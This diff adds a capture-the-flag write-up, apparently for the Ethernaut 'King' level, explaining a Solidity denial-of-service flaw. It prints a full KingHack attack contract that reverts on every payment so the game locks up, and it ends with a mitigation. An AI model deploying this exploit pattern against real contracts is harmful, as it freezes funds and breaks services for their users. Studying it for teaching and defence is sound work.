@@ -1,0 +1,87 @@
+---
+title: Level 9 - King
+slug: level-9
+published: 05-17-2023
+lastEdited:
+---
+
+## Objectives
+
+1. Break the game by making is unplayable.
+
+## Vulnerabilities
+
+### Flawed game logic
+
+The game logic has a flaw. When a new king is crowned, the game contract send the previous king the prize amount.
+
+```solidity
+receive() external payable {
+  require(msg.value >= prize || msg.sender == owner);
+  payable(king).transfer(msg.value);
+  king = msg.sender;
+  prize = msg.value;
+}
+```
+
+As it is implemented, the game breaks if that previous king can't receive eth. For this exploit, we make the king
+a contract that reverts everytime it receivers eth
+
+```solidity
+receive() external payable {
+    revert();
+}
+```
+
+## Exploit
+
+1. Write and deploy the following hack contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IKing {function prize() external view returns(uint);}
+
+contract KingHack {
+    IKing target;
+
+    constructor(address _targetAddress){
+        target = IKing(_targetAddress);
+    }
+
+    function attack() external payable {
+        require(msg.value >= target.prize() , "Not enough Eth");
+        (bool success,) = address(target).call{value: msg.value}("");
+        require(success, "Transaction not succssful");
+    }
+
+    receive() external payable {
+        revert();
+    }
+}
+```
+
+2. Call the `attack` function to break the game.
+
+## Suggested mitigation
+
+1. Replace `transfer` by `call` which
+
+```solidity
+receive() external payable {
+  require(msg.value >= prize || msg.sender == owner);
+  (bool success, ) = payable(king).call{value: msg.value}("");
+  if(success){
+    king = msg.sender;
+    prize = msg.value;
+  } else {
+    // Some logic for when call fails.
+  }
+
+}
+```
+
+## Further reading
+
+- King of the ether post-mortem <ExternalLink href={"http://www.kingoftheether.com/postmortem.html"} />
